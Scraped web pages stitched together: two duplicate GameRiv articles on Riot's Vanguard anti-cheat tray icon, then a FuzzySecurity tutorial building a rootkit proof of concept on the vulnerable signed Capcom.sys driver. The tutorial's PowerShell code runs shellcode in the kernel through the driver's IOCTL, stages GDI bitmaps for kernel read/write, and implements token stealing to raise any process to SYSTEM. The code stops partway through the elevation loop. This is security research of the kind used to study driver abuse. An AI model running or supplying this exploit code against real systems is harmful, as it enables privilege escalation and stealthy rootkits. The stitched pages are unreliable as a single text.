=== Content from twitter.com_f26d86ea_20250115_135956.html ===



=== Content from gameriv.com_7fe6f280_20250115_140103.html ===


[![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-dark-272-90.png)![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-white-272-90.png)](https://gameriv.com/ "GameRiv")

* [LoL](https://gameriv.com/league-of-legends/)
* [Apex](https://gameriv.com/apex-legends/)
* [Valorant](https://gameriv.com/valorant/)
* [Roblox](https://gameriv.com/roblox/)
* [CoD](https://gameriv.com/call-of-duty/)
  + [Modern Warfare 3](https://gameriv.com/call-of-duty/modern-warfare-3/)
  + [Warzone 2.0](https://gameriv.com/call-of-duty/warzone-2-0/)
* [Genshin](https://gameriv.com/genshin-impact/)
* [R6S](https://gameriv.com/rainbow-six-siege/)
* [Counter-Strike 2](https://gameriv.com/counter-strike-2/)
* [Guides](https://gameriv.com/guides/)
  + [Elden Ring](https://gameriv.com/elden-ring/)
  + [2XKO](https://gameriv.com/2xko/)
  + [Minecraft](https://gameriv.com/minecraft/)
  + [Pokémon](https://gameriv.com/pokemon/)
* [Gaming News](https://gameriv.com/gaming-news/)

Search

##### More

* [Destiny 2](https://gameriv.com/destiny/)
* [Fortnite](https://gameriv.com/fortnite/)
* [Overwatch 2](https://gameriv.com/overwatch-2/)
* [CS:GO](https://gameriv.com/csgo/)
##### Others

* [Teamfight Tactics](https://gameriv.com/tft/)
* [LoR](https://gameriv.com/lor/)
* [Wild Rift](https://gameriv.com/wild-rift/)
* [Tech](https://gameriv.com/tech/)
##### Quick Links

* [About Us](https://gameriv.com/about-us/)
* [Contact](https://gameriv.com/contact/)
* [Staff](https://gameriv.com/editorial-staff/)
* [Privacy Policy](https://gameriv.com/privacy-policy/)

© 2023 GameRiv

Reading:
Vanguard adds a system tray icon to give VALORANT players more control over it

 Share

**Aa**

[![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-dark-272-90.png)![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-white-272-90.png)](https://gameriv.com/ "GameRiv")

**Aa**

* [LoL](https://gameriv.com/league-of-legends/)
* [Apex](https://gameriv.com/apex-legends/)
* [Valorant](https://gameriv.com/valorant/)
* [Roblox](https://gameriv.com/roblox/)
* [CoD](https://gameriv.com/call-of-duty/)
* [Genshin](https://gameriv.com/genshin-impact/)
* [R6S](https://gameriv.com/rainbow-six-siege/)
* [Counter-Strike 2](https://gameriv.com/counter-strike-2/)
* [Guides](https://gameriv.com/guides/)
* [Gaming News](https://gameriv.com/gaming-news/)

Search

* [League of Legends](https://gameriv.com/league-of-legends/)
* [RobloxHOT](https://gameriv.com/roblox/)
* [Valorant](https://gameriv.com/valorant/)
* [Apex Legends](https://gameriv.com/apex-legends/)
* [Call of Duty](https://gameriv.com/call-of-duty/)
* [Genshin Impact](https://gameriv.com/genshin-impact/)
* [Guides](https://gameriv.com/guides/)

### Latest Stories

[![League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/wp-content/uploads/2025/01/League-of-Legends-All-Dumpling-Darlings-Skins-Revealed-330x220.jpg)](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/ "League of Legends All Dumpling Darlings Skins Revealed")

#### [League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/)

[![League of Legends All Mythmaker 2025 Skins Revealed](data:image/svg+xml...)](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/ "League of Legends All Mythmaker 2025 Skins Revealed")

#### [League of Legends All Mythmaker 2025 Skins Revealed](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/)

[![shaco legendary skin](data:image/svg+xml...)](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/ "League of Legends Upcoming Legendary Shaco Skin Revealed")

#### [League of Legends Upcoming Legendary Shaco Skin Revealed](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/)

### Stay Connected

Find us on socials

Facebook
Like

Twitter
Follow

* [About Us](https://gameriv.com/about-us/)
* [Contact](https://gameriv.com/contact/)
* [Staff](https://gameriv.com/editorial-staff/)
* [Privacy Policy](https://gameriv.com/privacy-policy/)

© 2023 GameRiv

 [Home](https://gameriv.com "Go to GameRiv.")  > [VALORANT](https://gameriv.com/valorant/ "Go to the VALORANT Category") > Vanguard adds a system tray icon to give VALORANT players more control over it

[VALORANT](https://gameriv.com/valorant/)
# Vanguard adds a system tray icon to give VALORANT players more control over it

![Nafiu Aziz](data:image/svg+xml...)![Nafiu Aziz](https://gameriv.com/wp-content/uploads/2024/08/279744370_7313438122061022_1093678039327072812_n.jpg)
Last updated: 2023/10/27 at 11:03 PM

*By*
[Nafiu Aziz](https://gameriv.com/author/zabrood/)

Published April 28, 2020

Share

2 Min Read

![Riot Vanguard](data:image/svg+xml...)![Riot Vanguard](https://gameriv.com/wp-content/uploads/2020/04/Riot-Vanguard.jpg)

Credit: Riot Games

**Riot Games launched the closed beta of [VALORANT](https://gameriv.com/valorant/) with strong anti-cheat protection called Vanguard from day one.**

Just after players realized that Vanguard actually works at the kernel level to deal with cheaters, many opposed the idea of Riot Games having such access to players’ personal devices. Many argued that they are not gonna subject themselves to Riot’s seemingly intrusive anti-cheat system just to play a video game.

Even though Riot continued to explain to their community that they were not selling user data, many rightfully concerned users were really not happy with Vanguard. Some complained about the fact that there wasn’t enough visual indication of when Vanguard was running in the background. As [Vanguard started at system boot](https://gameriv.com/valorants-anti-cheat-starts-upon-computer-boot-but-is-does-not-collect-or-send-any-data-confirmed-by-riot/), many also were concerned with external attacks by other malicious parties.

## **Vanguard will now show a system tray icon while it is running**

After listening to their community feedback regarding their anti-cheat solution, Riot Games finally decided to add a new visual component that will give you, the player, more visibility and control over it.

![Vanguard will now show a system tray icon while it is running](data:image/svg+xml...)![Vanguard will now show a system tray icon while it is running](https://gameriv.com/wp-content/uploads/2023/10/Vanguard-2.png)

If Vanguard blocks certain incompatible or vulnerable software from running on your machine, then you are gonna get a notification alert like this one above.

Clicking on the notification will provide you with more details on why your programs were not compatible with Vanguard.

![Vanguard will now show a system tray icon while it is running](data:image/svg+xml...)![Vanguard will now show a system tray icon while it is running](https://gameriv.com/wp-content/uploads/2023/10/Vanguard-3.png)

Riot Vanguard will now give you an option to uninstall it completely. However, if you uninstall it, you will not be able to play VALORANT. Right after you restart your PC, Vanguard will automatically reinstall itself. Only then will you be eligible to play [VALORANT](https://gameriv.com/valorant/).

Riot Games also decided to be more transparent with how Vanguard actually works without compromising its system too much. This level of openness from Riot Games is commendable.

 Share

[![](data:image/svg+xml...)![](https://gameriv.com/wp-content/uploads/2024/08/279744370_7313438122061022_1093678039327072812_n.jpg)](https://gameriv.com/author/zabrood/)
By
[Nafiu Aziz](https://gameriv.com/author/zabrood/)

Follow:

Nafiu Aziz is an avid gamer and a writer at GameRiv, covering Apex Legends, CS:GO, VALORANT, and plenty of other popular FPS titles in between. He scours the internet daily to get the latest scoop in esports.

#### Latest

[![League of Legends All Dumpling Darlings Skins Revealed](data:image/svg+xml...)![League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/wp-content/uploads/2025/01/League-of-Legends-All-Dumpling-Darlings-Skins-Revealed-150x150.jpg)](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/ "League of Legends All Dumpling Darlings Skins Revealed")

##### [League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![League of Legends All Mythmaker 2025 Skins Revealed](data:image/svg+xml...)![League of Legends All Mythmaker 2025 Skins Revealed](https://gameriv.com/wp-content/uploads/2025/01/Mythmaker-Jhin-Legendary-Skin-Splash-Art-Release-Date-and-Price-1-150x150.jpg)](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/ "League of Legends All Mythmaker 2025 Skins Revealed")

##### [League of Legends All Mythmaker 2025 Skins Revealed](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![shaco legendary skin](data:image/svg+xml...)![shaco legendary skin](https://gameriv.com/wp-content/uploads/2025/01/Cats-Shaco-150x150.jpg)](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/ "League of Legends Upcoming Legendary Shaco Skin Revealed")

##### [League of Legends Upcoming Legendary Shaco Skin Revealed](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![Shan-Uzal Mordekaiser Exalted Skin Splash Art, Release Date, and Price](data:image/svg+xml...)![Shan-Uzal Mordekaiser Exalted Skin Splash Art, Release Date, and Price](https://gameriv.com/wp-content/uploads/2025/01/Shan-Uzal-Mordekaiser-Exalted-Skin-Splash-Art-Release-Date-and-Price-150x150.jpg)](https://gameriv.com/shan-uzal-mordekaiser-exalted-skin-splash-art-release-date-and-price/ "Shan-Uzal Mordekaiser Exalted Skin: Splash Art, Release Date, and Price")

##### [Shan-Uzal Mordekaiser Exalted Skin: Splash Art, Release Date, and Price](https://gameriv.com/shan-uzal-mordekaiser-exalted-skin-splash-art-release-date-and-price/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![gameriv logo](data:image/svg+xml...)![gameriv logo](https://gameriv.com/wp-content/uploads/2024/07/gameriv-dark-272-90.png)
![gameriv logo dark](data:image/svg+xml...)](https://gameriv.com/)

Esports, Gaming, and Entertainment News

I have read and agree to the terms & conditions
Leave this field empty if you're human:

#### Popular

* [League of Legends](https://gameriv.com/league-of-legends/)
* [Guides](https://gameriv.com/guides/)
* [Valorant](https://gameriv.com/valorant/)
* [Apex Legends](https://gameriv.com/apex-legends/)
* [Gaming News](https://gameriv.com/gaming-news/)

#### Quick Links

* [About Us](https://gameriv.com/about-us/)
* [Contact](https://gameriv.com/contact/)
* [Staff](https://gameriv.com/editorial-staff/)
* [Term & Condition](https://gameriv.com/term-condition/)
* [Privacy Policy](https://gameriv.com/privacy-policy/)

© 2023 GameRiv

Welcome Back!

Sign in to your account

Username or Email Address

Password

 Remember Me

[Lost your password?](https://gameriv.com/gr-login/?action=lostpassword)



=== Content from gameriv.com_a7b52f64_20250115_140100.html ===


[![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-dark-272-90.png)![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-white-272-90.png)](https://gameriv.com/ "GameRiv")

* [LoL](https://gameriv.com/league-of-legends/)
* [Apex](https://gameriv.com/apex-legends/)
* [Valorant](https://gameriv.com/valorant/)
* [Roblox](https://gameriv.com/roblox/)
* [CoD](https://gameriv.com/call-of-duty/)
  + [Modern Warfare 3](https://gameriv.com/call-of-duty/modern-warfare-3/)
  + [Warzone 2.0](https://gameriv.com/call-of-duty/warzone-2-0/)
* [Genshin](https://gameriv.com/genshin-impact/)
* [R6S](https://gameriv.com/rainbow-six-siege/)
* [Counter-Strike 2](https://gameriv.com/counter-strike-2/)
* [Guides](https://gameriv.com/guides/)
  + [Elden Ring](https://gameriv.com/elden-ring/)
  + [2XKO](https://gameriv.com/2xko/)
  + [Minecraft](https://gameriv.com/minecraft/)
  + [Pokémon](https://gameriv.com/pokemon/)
* [Gaming News](https://gameriv.com/gaming-news/)

Search

##### More

* [Destiny 2](https://gameriv.com/destiny/)
* [Fortnite](https://gameriv.com/fortnite/)
* [Overwatch 2](https://gameriv.com/overwatch-2/)
* [CS:GO](https://gameriv.com/csgo/)
##### Others

* [Teamfight Tactics](https://gameriv.com/tft/)
* [LoR](https://gameriv.com/lor/)
* [Wild Rift](https://gameriv.com/wild-rift/)
* [Tech](https://gameriv.com/tech/)
##### Quick Links

* [About Us](https://gameriv.com/about-us/)
* [Contact](https://gameriv.com/contact/)
* [Staff](https://gameriv.com/editorial-staff/)
* [Privacy Policy](https://gameriv.com/privacy-policy/)

© 2023 GameRiv

Reading:
Vanguard adds a system tray icon to give VALORANT players more control over it

 Share

**Aa**

[![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-dark-272-90.png)![GameRiv](https://gameriv.com/wp-content/uploads/2024/07/gameriv-white-272-90.png)](https://gameriv.com/ "GameRiv")

**Aa**

* [LoL](https://gameriv.com/league-of-legends/)
* [Apex](https://gameriv.com/apex-legends/)
* [Valorant](https://gameriv.com/valorant/)
* [Roblox](https://gameriv.com/roblox/)
* [CoD](https://gameriv.com/call-of-duty/)
* [Genshin](https://gameriv.com/genshin-impact/)
* [R6S](https://gameriv.com/rainbow-six-siege/)
* [Counter-Strike 2](https://gameriv.com/counter-strike-2/)
* [Guides](https://gameriv.com/guides/)
* [Gaming News](https://gameriv.com/gaming-news/)

Search

* [League of Legends](https://gameriv.com/league-of-legends/)
* [RobloxHOT](https://gameriv.com/roblox/)
* [Valorant](https://gameriv.com/valorant/)
* [Apex Legends](https://gameriv.com/apex-legends/)
* [Call of Duty](https://gameriv.com/call-of-duty/)
* [Genshin Impact](https://gameriv.com/genshin-impact/)
* [Guides](https://gameriv.com/guides/)

### Latest Stories

[![League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/wp-content/uploads/2025/01/League-of-Legends-All-Dumpling-Darlings-Skins-Revealed-330x220.jpg)](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/ "League of Legends All Dumpling Darlings Skins Revealed")

#### [League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/)

[![League of Legends All Mythmaker 2025 Skins Revealed](data:image/svg+xml...)](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/ "League of Legends All Mythmaker 2025 Skins Revealed")

#### [League of Legends All Mythmaker 2025 Skins Revealed](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/)

[![shaco legendary skin](data:image/svg+xml...)](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/ "League of Legends Upcoming Legendary Shaco Skin Revealed")

#### [League of Legends Upcoming Legendary Shaco Skin Revealed](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/)

### Stay Connected

Find us on socials

Facebook
Like

Twitter
Follow

* [About Us](https://gameriv.com/about-us/)
* [Contact](https://gameriv.com/contact/)
* [Staff](https://gameriv.com/editorial-staff/)
* [Privacy Policy](https://gameriv.com/privacy-policy/)

© 2023 GameRiv

 [Home](https://gameriv.com "Go to GameRiv.")  > [VALORANT](https://gameriv.com/valorant/ "Go to the VALORANT Category") > Vanguard adds a system tray icon to give VALORANT players more control over it

[VALORANT](https://gameriv.com/valorant/)
# Vanguard adds a system tray icon to give VALORANT players more control over it

![Nafiu Aziz](data:image/svg+xml...)![Nafiu Aziz](https://gameriv.com/wp-content/uploads/2024/08/279744370_7313438122061022_1093678039327072812_n.jpg)
Last updated: 2023/10/27 at 11:03 PM

*By*
[Nafiu Aziz](https://gameriv.com/author/zabrood/)

Published April 28, 2020

Share

2 Min Read

![Riot Vanguard](data:image/svg+xml...)![Riot Vanguard](https://gameriv.com/wp-content/uploads/2020/04/Riot-Vanguard.jpg)

Credit: Riot Games

**Riot Games launched the closed beta of [VALORANT](https://gameriv.com/valorant/) with strong anti-cheat protection called Vanguard from day one.**

Just after players realized that Vanguard actually works at the kernel level to deal with cheaters, many opposed the idea of Riot Games having such access to players’ personal devices. Many argued that they are not gonna subject themselves to Riot’s seemingly intrusive anti-cheat system just to play a video game.

Even though Riot continued to explain to their community that they were not selling user data, many rightfully concerned users were really not happy with Vanguard. Some complained about the fact that there wasn’t enough visual indication of when Vanguard was running in the background. As [Vanguard started at system boot](https://gameriv.com/valorants-anti-cheat-starts-upon-computer-boot-but-is-does-not-collect-or-send-any-data-confirmed-by-riot/), many also were concerned with external attacks by other malicious parties.

## **Vanguard will now show a system tray icon while it is running**

After listening to their community feedback regarding their anti-cheat solution, Riot Games finally decided to add a new visual component that will give you, the player, more visibility and control over it.

![Vanguard will now show a system tray icon while it is running](data:image/svg+xml...)![Vanguard will now show a system tray icon while it is running](https://gameriv.com/wp-content/uploads/2023/10/Vanguard-2.png)

If Vanguard blocks certain incompatible or vulnerable software from running on your machine, then you are gonna get a notification alert like this one above.

Clicking on the notification will provide you with more details on why your programs were not compatible with Vanguard.

![Vanguard will now show a system tray icon while it is running](data:image/svg+xml...)![Vanguard will now show a system tray icon while it is running](https://gameriv.com/wp-content/uploads/2023/10/Vanguard-3.png)

Riot Vanguard will now give you an option to uninstall it completely. However, if you uninstall it, you will not be able to play VALORANT. Right after you restart your PC, Vanguard will automatically reinstall itself. Only then will you be eligible to play [VALORANT](https://gameriv.com/valorant/).

Riot Games also decided to be more transparent with how Vanguard actually works without compromising its system too much. This level of openness from Riot Games is commendable.

 Share

[![](data:image/svg+xml...)![](https://gameriv.com/wp-content/uploads/2024/08/279744370_7313438122061022_1093678039327072812_n.jpg)](https://gameriv.com/author/zabrood/)
By
[Nafiu Aziz](https://gameriv.com/author/zabrood/)

Follow:

Nafiu Aziz is an avid gamer and a writer at GameRiv, covering Apex Legends, CS:GO, VALORANT, and plenty of other popular FPS titles in between. He scours the internet daily to get the latest scoop in esports.

#### Latest

[![League of Legends All Dumpling Darlings Skins Revealed](data:image/svg+xml...)![League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/wp-content/uploads/2025/01/League-of-Legends-All-Dumpling-Darlings-Skins-Revealed-150x150.jpg)](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/ "League of Legends All Dumpling Darlings Skins Revealed")

##### [League of Legends All Dumpling Darlings Skins Revealed](https://gameriv.com/league-of-legends-all-dumpling-darlings-skins-revealed/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![League of Legends All Mythmaker 2025 Skins Revealed](data:image/svg+xml...)![League of Legends All Mythmaker 2025 Skins Revealed](https://gameriv.com/wp-content/uploads/2025/01/Mythmaker-Jhin-Legendary-Skin-Splash-Art-Release-Date-and-Price-1-150x150.jpg)](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/ "League of Legends All Mythmaker 2025 Skins Revealed")

##### [League of Legends All Mythmaker 2025 Skins Revealed](https://gameriv.com/league-of-legends-all-mythmaker-2025-skins-revealed/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![shaco legendary skin](data:image/svg+xml...)![shaco legendary skin](https://gameriv.com/wp-content/uploads/2025/01/Cats-Shaco-150x150.jpg)](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/ "League of Legends Upcoming Legendary Shaco Skin Revealed")

##### [League of Legends Upcoming Legendary Shaco Skin Revealed](https://gameriv.com/league-of-legends-upcoming-legendary-shaco-skin-revealed/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![Shan-Uzal Mordekaiser Exalted Skin Splash Art, Release Date, and Price](data:image/svg+xml...)![Shan-Uzal Mordekaiser Exalted Skin Splash Art, Release Date, and Price](https://gameriv.com/wp-content/uploads/2025/01/Shan-Uzal-Mordekaiser-Exalted-Skin-Splash-Art-Release-Date-and-Price-150x150.jpg)](https://gameriv.com/shan-uzal-mordekaiser-exalted-skin-splash-art-release-date-and-price/ "Shan-Uzal Mordekaiser Exalted Skin: Splash Art, Release Date, and Price")

##### [Shan-Uzal Mordekaiser Exalted Skin: Splash Art, Release Date, and Price](https://gameriv.com/shan-uzal-mordekaiser-exalted-skin-splash-art-release-date-and-price/)

[League of Legends](https://gameriv.com/league-of-legends/)

[![gameriv logo](data:image/svg+xml...)![gameriv logo](https://gameriv.com/wp-content/uploads/2024/07/gameriv-dark-272-90.png)
![gameriv logo dark](data:image/svg+xml...)](https://gameriv.com/)

Esports, Gaming, and Entertainment News

I have read and agree to the terms & conditions
Leave this field empty if you're human:

#### Popular

* [League of Legends](https://gameriv.com/league-of-legends/)
* [Guides](https://gameriv.com/guides/)
* [Valorant](https://gameriv.com/valorant/)
* [Apex Legends](https://gameriv.com/apex-legends/)
* [Gaming News](https://gameriv.com/gaming-news/)

#### Quick Links

* [About Us](https://gameriv.com/about-us/)
* [Contact](https://gameriv.com/contact/)
* [Staff](https://gameriv.com/editorial-staff/)
* [Term & Condition](https://gameriv.com/term-condition/)
* [Privacy Policy](https://gameriv.com/privacy-policy/)

© 2023 GameRiv

Welcome Back!

Sign in to your account

Username or Email Address

Password

 Remember Me

[Lost your password?](https://gameriv.com/gr-login/?action=lostpassword)



=== Content from www.fuzzysecurity.com_fb55ff92_20250115_140057.html ===

[![](../images/logo.png)](index.html)

* [Home](../index.html)
* [Tutorials](../tutorials.html)
* [Scripting](../coding.html)
* [Exploits](../exploits.html)
* [Links](../links.html)
* [Patreon](../patreon.html)
* [Contact](../contact.html)

---

* [Home](../index.html) **»**
* [Tutorials](../tutorials.html) **»**
* Capcom Rootkit POC

[![](https://c5.patreon.com/external/logo/become_a_patron_button.png)](https://www.patreon.com/FuzzySec)
## Capcom Rootkit Proof-Of-Concept

Hola and welcome! Recently I was reading an [article](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/) on the Derusbi malware. The focus of the post was on a technique used by the malware authors which leveraged a vulnerability ([CVE-2013-3956](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3956)) in a signed Novell driver to flip some bits in the kernel which temporarily disabled the driver signing requirement. Once disabled, Derusbi loaded a NDIS driver, presumably this allowed for transparent sniffing and transmission of raw packets (I have not looked into the specifics).

Anyway, I was curious how difficult it would be to put together a POC with the same basic functionality (not very difficult as it turns out!). To fully simulate the attacker's scenario I decided to use a vulnerability in a signed driver, Capcom.sys, first disclosed by [@TheWack0lian](https://twitter.com/TheWack0lian/status/779397840762245124) on 23 September 2016. Enough nonsense, let get to it!

**Resources:**

+ Capcom-Rootkit ([@FuzzySec](https://twitter.com/fuzzysec)) - [here](https://github.com/FuzzySecurity/Capcom-Rootkit)

+ Windows driver signing bypass by Derusbi - [here](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/)

+ A quick insight into the Driver Signature Enforcement ([@j00ru](https://twitter.com/j00ru)) - [here](http://j00ru.vexillium.org/?p=377)

+ Defeating x64 Driver Signature Enforcement ([@hFireF0X](https://twitter.com/hfiref0x)) - [here](http://www.kernelmode.info/forum/viewtopic.php?f=11&t=3322)

## Driver Vulnerability

The main goal of this post is not to analyse the driver bug. I highly recommend that you have a look at [@TheColonial](https://twitter.com/TheColonial) most excellent walkthrough's to get a better picture of the exploitation process.

Essentially, the driver provides ring0 code execution as a service! It's only function is to take a user-land pointer, disable [SMEP](http://j00ru.vexillium.org/?p=783), execute code at the pointer address and re-enable SMEP. A disassembly of the offending function can be seen below.

![](images/Capcom_1.png)

The powershell POC below illustrates how this issue can be exploited practically.

```

# Some tricks here
# => cmp [rax-8], rcx
echo "`n[>] Allocating Capcom payload.."
[IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
$ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
[System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
echo "[+] Payload size: $(8 + $Shellcode.Length)"
echo "[+] Payload address: $("{0:X}" -f $Pointer.ToInt64())"

$hDevice = [CapCom]::CreateFile("\\.\Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

if ($hDevice -eq -1) {
	echo "`n[!] Unable to get driver handle..`n"
	Return
} else {
	echo "`n[>] Driver information.."
	echo "[+] lpFileName: \\.\Htsysm72FB"
	echo "[+] Handle: $hDevice"
}

# IOCTL = 0xAA013044
#---
$InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
$OutBuff = 0x1234
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($InBuff.Length)"
echo "[+] IOCTL: 0xAA013044"
[CapCom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null
```

With the ability to execute arbitrary shellcode, I chose to stage a GDI bitmap primitive which would give me persistent read/write in the kernel without needing to call the driver over and over again. To create the bitmaps I used [Stage-gSharedInfoBitmap](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-gSharedInfoBitmap.ps1) and set up the shellcode in the following manner.

```

# Leak BitMap pointers
echo "`n[>] gSharedInfo bitmap leak.."
$Manager = Stage-gSharedInfoBitmap
$Worker = Stage-gSharedInfoBitmap
echo "[+] Manager bitmap Kernel address: 0x$("{0:X16}" -f $($Manager.BitmapKernelObj))"
echo "[+] Worker bitmap Kernel address: 0x$("{0:X16}" -f $($Worker.BitmapKernelObj))"

# Shellcode buffer
[Byte[]] $Shellcode = @(
	0x48, 0xB8) + [System.BitConverter]::GetBytes($Manager.BitmappvScan0) + @( # mov rax,$Manager.BitmappvScan0
	0x48, 0xB9) + [System.BitConverter]::GetBytes($Worker.BitmappvScan0)  + @( # mov rcx,$Manager.BitmappvScan0
	0x48, 0x89, 0x08,                                                          # mov qword ptr [rax],rcx
	0xC3                                                                       # ret
)
```

Further details on this technique can be found in a post I wrote for [@mwrlabs](https://twitter.com/mwrlabs) titled [A Tale Of Bitmaps: Leaking GDI Objects Post Windows 10 Anniversary Edition](https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/) and [part 17](http://www.fuzzysecurity.com/tutorials/expDev/21.html) of my Windows exploit development tutorial series.

## Rootkit Functionality

Now we have arbitrary read/write in the kernel we can start working on our rootkit functionality. I decided to focus on two different features: (1) Elevating arbitrary PID's to SYSTEM and (2) disabling driver signing enforcement at runtime to load unsigned code into the kernel.

**Arbitrary Process Elevation**

At a high level we need to traverse the linked list of EPROCESS structures, copy the SYSTEM EPROCESS token field and use this value to overwrite the token field of the target EPROCESS structure. Without any kind of vulnerability in hand we can actually leak a pointer to the System (PID 4) EPROCESS entry from user-land.

![](images/Capcom_2.png)

It should be noted that using "SystemModuleInformation" to leak the base address of the currently loaded NT kernel only works from a medium integrity process since Windows 8.1. We can easily implement this process in powershell, using [Get-LoadedModules](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Get-LoadedModules.ps1), and verify our results in KD.

![](images/Capcom_3.png)![](images/Capcom_4.png)

Cool, so we have a way to get a pointer to the System EPROCESS struct and using our bitmap primitive we can easily read out the SYSTEM token associated with that process. The final thing we need to do is traverse the "ActiveProcessLinks" linked list to find the EPROCESS struct associated with the PID we want to elevate. A representation of this linked list, using x64 Win10 offsets, is shown below.

![](images/Capcom_5.png)

This linked list obviously extends on either side and loops round on itself. In simple terms, we will use our bitmap primitive to read the PID of the current EPROCESS structure, if it matches the PID we are targeting we will overwrite the process token, if it does not match we read out the address of the next EPROCESS structure from the "ActiveProcessLinks->Flink" and try again.

The EPROCESS struct is opaque (MSFT slang for undocumented) and changes between versions of the Windows OS but we can maintain a list of static offsets to take care of this! I highly recommend having a look at the [Terminus Project](http://terminus.rewolf.pl/terminus/) by [@rwfpl](https://twitter.com/rwfpl). The powershell function below implements this token-stealing logic.

```

function Capcom-ElevatePID {
	param ([Int]$ProcPID)

	# Check our bitmaps have been staged into memory
	if (!$ManagerBitmap -Or !$WorkerBitmap) {
		Capcom-StageGDI
		if ($DriverNotLoaded -eq $true) {
			Return
		}
	}

	# Defaults to elevating Powershell
	if (!$ProcPID) {
		$ProcPID = $PID
	}

	# Make sure the pid exists!
	# 0 is also invalid but will default to $PID
	$IsValidProc = ((Get-Process).Id).Contains($ProcPID)
	if (!$IsValidProc) {
		Write-Output "`n[!] Invalid process specified!`n"
		Return
	}

	# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
	# WARNING offsets are invalid for Pre-RTM images!
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			$UniqueProcessIdOffset = 0x2e8
			$TokenOffset = 0x358
			$ActiveProcessLinks = 0x2f0
		}

		'6.3' # Win8.1 / 2k12R2
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348
			$ActiveProcessLinks = 0x2e8
		}

		'6.2' # Win8 / 2k12
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348
			$ActiveProcessLinks = 0x2e8
		}

		'6.1' # Win7 / 2k8R2
		{
			$UniqueProcessIdOffset = 0x180
			$TokenOffset = 0x208
			$ActiveProcessLinks = 0x188
		}
	}

	# Get EPROCESS entry for System process
	$SystemModuleArray = Get-LoadedModules
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
	$KernelHanle = [Capcom]::LoadLibrary("$KernelType")
	$PsInitialSystemProcess = [Capcom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
	$SysEprocessPtr = $PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase
	$CallResult = [Capcom]::FreeLibrary($KernelHanle)
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	Write-Output "`n[+] SYSTEM Token: 0x$("{0:X}" -f $SysToken)"

	# Get EPROCESS entry for PID
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $ProcPID) {
